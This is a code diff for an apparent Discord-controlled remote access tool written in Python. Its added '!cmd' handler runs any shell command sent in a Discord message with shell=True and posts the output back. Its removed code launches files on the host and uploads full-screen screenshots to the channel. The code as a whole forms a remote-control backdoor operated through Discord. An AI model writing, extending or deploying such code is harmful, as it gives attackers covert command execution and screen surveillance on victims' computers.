@@ -4,89 +4,58 @@ import os
 from PIL import ImageGrab
 import discord
 
-async def execute_command(command, ctx):
-    """Execute a shell command and send output to Discord"""
+# ========== MAIN CODE THAT GETS INSERTED INTO THE BOT COMMAND ==========
+
+# This creates a !cmd command for executing shell commands
+await ctx.send("🖥️ Executing shell command...")
+
+# Get the command from the message (remove "!cmd " prefix)
+if ctx.message.content.startswith('!cmd '):
+    command_text = ctx.message.content[5:].strip()
+else:
+    # Fallback - get everything after first space
+    parts = ctx.message.content.split(' ', 1)
+    command_text = parts[1] if len(parts) > 1 else ""
+
+if not command_text:
+    await ctx.send('```Syntax: !cmd <command>```')
+else:
     try:
         # Execute the command
-        result = subprocess.run(command, capture_output=True, shell=True, text=True, timeout=30)
+        result = subprocess.run(command_text, capture_output=True, shell=True, text=True, timeout=30)
         cmd_output = result.stdout.strip()
         
         if not cmd_output:
             cmd_output = "Command executed successfully (no output)"
         
         # Send command header
-        await ctx.send(f'```Executed command: {command}\nstdout:```')
+        await ctx.send(f'```Executed command: {command_text}```')
+        await ctx.send('```stdout:```')
         
         # Split output into chunks and send
-        message_buffer = ''
-        for line in cmd_output.split('\n'):
-            if len(message_buffer) + len(line) > 1950:
-                await ctx.send(f'```{message_buffer}```')
-                message_buffer = line
+        if len(cmd_output) <= 1900:
+            await ctx.send(f'```{cmd_output}```')
+        else:
+            # Split into chunks that fit Discord's message limit
+            chunks = [cmd_output[i:i+1900] for i in range(0, len(cmd_output), 1900)]
+            for i, chunk in enumerate(chunks):
+                await ctx.send(f'```{chunk}```')
+        
+        # Send stderr if any
+        if result.stderr.strip():
+            await ctx.send('```stderr:```')
+            stderr_output = result.stderr.strip()
+            if len(stderr_output) <= 1900:
+                await ctx.send(f'```{stderr_output}```')
             else:
-                message_buffer += line + '\n'
+                chunks = [stderr_output[i:i+1900] for i in range(0, len(stderr_output), 1900)]
+                for chunk in chunks:
+                    await ctx.send(f'```{chunk}```')
         
-        # Send remaining buffer
-        if message_buffer:
-            await ctx.send(f'```{message_buffer}```')
-        
-        # Send footer
-        await ctx.send('```End of command stdout```')
+        # Send footer with return code
+        await ctx.send(f'```Command completed with return code: {result.returncode}```')
         
     except subprocess.TimeoutExpired:
         await ctx.send('```Command timed out after 30 seconds```')
     except Exception as e:
         await ctx.send(f'```Error executing command: {str(e)}```')
-
-async def execute_file(filename, ctx):
-    """Execute a file and send screenshot as proof"""
-    try:
-        # Check if file exists
-        if not os.path.exists(filename):
-            await ctx.send('```❗ File or directory not found.```')
-            return
-        
-        # Execute the file
-        subprocess.run(f'start "" "{filename}"', shell=True)
-        
-        # Wait a moment for the program to start
-        await asyncio.sleep(2)
-        
-        # Take screenshot
-        screenshot_path = 'ss.png'
-        ImageGrab.grab(all_screens=True).save(screenshot_path)
-        
-        # Send screenshot embed
-        embed = discord.Embed(
-            title=f'Executed: {filename}',
-            color=discord.Color.green()
-        )
-        embed.set_image(url='attachment://ss.png')
-        
-        await ctx.send(embed=embed, file=discord.File(screenshot_path))
-        
-        # Cleanup screenshot file
-        try:
-            os.remove(screenshot_path)
-        except:
-            pass
-        
-        await ctx.send(f'```Successfully executed: {filename}```')
-        
-    except Exception as e:
-        await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')
-
-# Main command handler
-if ctx.message.content.startswith('.cmd '):
-    command = ctx.message.content[5:].strip()
-    if command:
-        await execute_command(command, ctx)
-    else:
-        await ctx.send('```Syntax: .cmd <command>```')
-
-elif ctx.message.content.startswith('.execute '):
-    filename = ctx.message.content[9:].strip()
-    if filename:
-        await execute_file(filename, ctx)
-    else:
-        await ctx.send('```Syntax: .execute <filename>```')
